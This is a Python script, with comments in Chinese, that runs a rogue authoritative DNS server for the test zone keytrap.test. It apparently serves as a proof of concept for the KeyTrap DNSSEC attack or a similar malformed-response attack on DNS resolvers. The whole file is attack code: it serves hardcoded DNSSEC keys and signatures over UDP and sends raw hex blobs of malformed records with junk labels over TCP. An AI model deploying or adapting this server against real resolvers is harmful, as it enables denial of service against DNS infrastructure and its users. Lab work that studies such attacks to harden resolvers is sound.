import time
from socket import *
from select import select
from _thread import *

from scapy.layers.dns import DNS, DNSQR, DNSRR, DNSRRRSIG, DNSRRDNSKEY
from scapy.layers.inet import IP, UDP, TCP
from datetime import datetime
import base64

# 配置DNS服务器的IP和端口
DNS_SERVER_IP = "10.10.0.3"
PORT_OF_SERVER = 53
header_count_hex = "87e00001000400000000"
header_count_hex_tcp = "84000001000400000000"
annsar_hex = "03737562212a752d797a23385c6f22645f7728375b665e2b352f396e3f6a26307467767e6336047265633108787565736f6e676203636f6d00000600010000003c008a0373756203737562212a752d797a23385c6f22645f7728375b665e2b352f396e3f6a26307467767e6336047265633108787565736f6e676203636f6d0003737562212a752d797a23385c6f22645f7728375b665e2b352f396e3f6a26307467767e6336047265633108787565736f6e676203636f6d00000000000000000000000000000000000000000009743b347c6b272d793f047265633108787565736f6e676203636f6d00000600010000003c00560d6e65772d743b347c6b272d793f047265633108787565736f6e676203636f6d000d6e65772d743b347c6b272d793f047265633108787565736f6e676203636f6d00000000000000000000000000000000000000000007336467616d657303636f6d02617200000600010000003c003003636f6d026172000373756207336467616d657303636f6d02617200000000000000000000000000000000000000000003737562212a752d797a23385c6f22645f7728375b665e2b352f396e3f6a26307467767e6336047265633108787565736f6e676203636f6d00001000010000003c001312726563312e787565736f6e67622e636f6d2e"
s_input = []
target_domain = "www.keytrap.test"

# 每次签名都必须更新以下条目：INCEPTION, EXPIRATION, RRSIG
GLOBAL_TTL = 86400
INCEPTION = datetime.strptime("20240928101351", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
EXPIRATION = datetime.strptime("20241028101351", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
RRSIG={
    "www.keytrap.test." : base64.b64decode("KgVnod8gSnLvzOYVSQGZafGTPRowJp/okxRFIYCCN3ez7fefodhefbPbPVQmFjRYBZ9jxjhcE00aOcLX1GGHYpxPSplasDvuHPwLNwJdb4qjIeYW1dmP+xoVMIcHjBZU"),
    "keytrap.test."     : base64.b64decode("s0ZmWQHEJoZ51gzJMG0ZyGXWs5oRPnhi7+peKM3pKxTYyVHPHy1dV5ERkDncxQT8ayLrseDLSKeC+Sx46cbFigs+LHKBcdCcTg+W8oFn8L0GnzTtIuLaEf0Dvbn3d37/"),
    "ns1.keytrap.test." : base64.b64decode("f+pnEtvtuV+/6gd1SmBttrPQ5IT6z4H90G26kCe03n3fnPlDzvTCorNCdrgy3P331b+r19+yn6Jc0uOx92Z7TnmfOXWDmLWR8uEGcZf9CWjbRYo8F+ckvoQIFH6JTPfF"),
    "KSK": base64.b64decode("YAqwWzt0bBSz/eyX9oQmAcMEKKDD7J+OHymxi3hnzXjZ0fcIUMLrVGqznYdcbaHbW+X6RoERwCrXdOQru//lCU/UhcHjJj/bjalWYWxiQyGmzfb0bpZ/NGxngzrFaGW1"),
    "ZSK": base64.b64decode("9wVtsq9/vpBWxGRjlvRDjHJyqsvrmsMwc3w1yaNNL4dRE3Od+wRSriJX6+utEU45jy1tZmvi7DfN4vF6VcN37ElQDREmOoD0wXDldIVR/o2Z40rWmheLBffdLCSfD8+n"),
}

DNSKEY={
    "KSK": base64.b64decode("MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hl hZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zht L4aGaOG+870yHwuY"),
    "ZSK": base64.b64decode("DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+k ii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+n GjmIa59+W1iMdEYb"),
}

# Generate DNS-format NAME
def makeDNSName(name):
    name = name.decode("UTF-8")
    name = name.rstrip(".") + "."
    res = ""
    labels = name.split(".")
    for ele in labels:
        res += chr(len(ele)) + ele
    return res.encode()


# Generate bytes stream
def bytesField(inp, bytesCount):
    return inp.to_bytes(bytesCount, byteorder="big")


# Generate two bytes stream
def twoBytesField(inp):
    return bytesField(inp, 2)


def qd_to_bytes(qd):
    return makeDNSName(qd.qname) + twoBytesField(qd.qtype) + twoBytesField(qd.qclass)


def tcp_thread(s):
    global header_count_hex, annsar_hex
    global s_input

    try:
        data = s.recv(4096)
        if not data:
            s_input.remove(s)
            s.close()

        dns = DNS(data[2:])
        txid = dns.id.to_bytes(2, byteorder="big")
        qd = dns.qd

        if target_domain not in str(qd.qname).lower():
            return

        dns_response = txid + bytes.fromhex(header_count_hex_tcp) + qd_to_bytes(qd) + bytes.fromhex(annsar_hex)
        dns_response = twoBytesField(len(dns_response)) + dns_response
        s.sendall(dns_response[:])
        print("from %s (TCP) : %s %04x" % ("addr", qd.qname.decode("utf-8"), dns.id))
    except:
        pass


# 构造DNS响应
def craft_dns_response(dnsqr, qname, qtype):
    # 查询A记录
    if qtype == 1:
        dnsrp = DNS(id=dnsqr.id, qr=1, aa=1, ad=1, qd=dnsqr.qd,
                        an=
                            DNSRR(rrname=qname, type=1, ttl=GLOBAL_TTL, rdata="124.222.27.40") /
                            DNSRRRSIG(rrname=qname, labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
                            expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
                            signersname="keytrap.test", signature=RRSIG["www.keytrap.test."]),
                        ns=
                            DNSRR(rrname="keytrap.test.", type=2, ttl=GLOBAL_TTL, rdata="ns1.keytrap.test.") /
                            DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=2, originalttl=GLOBAL_TTL,
                             expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14, 
                             signersname="keytrap.test", signature=RRSIG["keytrap.test."]),
                        ar=
                            DNSRR(rrname="ns1.keytrap.test.", type=1, ttl=GLOBAL_TTL, rdata="124.222.27.40") /
                            DNSRRRSIG(rrname="ns1.keytrap.test.", labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, 
                            expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, 
                            signersname="keytrap.test", signature=RRSIG["ns1.keytrap.test."]),
                    )

    # 查询DNSKEY记录
    elif qtype == 48:
        dnsrp = DNS(id=dnsqr.id, qr=1, aa=1, ad=1, qd=dnsqr.qd,
                    an=
                        DNSRRDNSKEY(rrname="keytrap.test.", ttl=GLOBAL_TTL, algorithm=14, flags=256, publickey=DNSKEY["ZSK"]) /
                        DNSRRDNSKEY(rrname="keytrap.test.", ttl=GLOBAL_TTL, algorithm=14, flags=257, publickey=DNSKEY['KSK']) /
                        DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=48, originalttl=GLOBAL_TTL,
                        expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14, 
                        signersname="keytrap.test.", signature=RRSIG["ZSK"]) /
                        DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=48, originalttl=GLOBAL_TTL,
                         expiration=EXPIRATION, inception=INCEPTION, keytag=30130, algorithm=14, 
                         signersname="keytrap.test.", signature=RRSIG["KSK"]),
                )
    else:
        dnsrp = DNS(id=dnsqr.id, qr=1, aa=1, ad=1, qd=dnsqr.qd, rcode=3,
                         ns=
                            DNSRR(rrname="keytrap.test.", type=2, ttl=GLOBAL_TTL, rdata="ns1.keytrap.test.") /
                            DNSRRRSIG(rrname="keytrap.test.", labels=2, ttl=GLOBAL_TTL, typecovered=2, originalttl=GLOBAL_TTL, 
                            expiration=EXPIRATION, inception=INCEPTION, keytag=6350, algorithm=14, 
                            signersname="keytrap.test", signature=RRSIG["keytrap.test."])
                        )
        
    return dnsrp

def udp_thread(s):
    global header_count_hex, annsar_hex

    data, addr = s.recvfrom(4096)
    dns = DNS(data)
    txid = dns.id.to_bytes(2, byteorder="big")
    qd = dns.qd

    if target_domain not in str(qd.qname).lower():
        return

    dns_response = craft_dns_response(dns, qd.qname, qd.qtype)
    s.sendto(bytes(dns_response), addr)
    print("from %s (UDP) : %s %04x" % (addr, qd.qname.decode("utf-8"), dns.id))


def run():
    global DNS_SERVER_IP, PORT_OF_SERVER
    global s_input

    # create tcp socket
    s_tcp = socket(AF_INET, SOCK_STREAM)
    s_tcp.bind((DNS_SERVER_IP, PORT_OF_SERVER))
    s_tcp.setblocking(False)
    s_tcp.listen(5)

    # create udp socket
    s_udp = socket(AF_INET, SOCK_DGRAM)
    s_udp.bind((DNS_SERVER_IP, PORT_OF_SERVER))

    s_input = [s_tcp, s_udp]

    while True:
        ready_to_read, _, _ = select(s_input, [], [])
        for s in ready_to_read:
            if s == s_tcp:
                c, addr = s.accept()
                c.setblocking(False)
                s_input.append(c)
            elif s == s_udp:
                start_new_thread(udp_thread, (s,))
            elif s.type == SOCK_STREAM:
                start_new_thread(tcp_thread, (s,))
            else:
                continue


if __name__ == '__main__':
    print("DNS authority starts...")
    run()
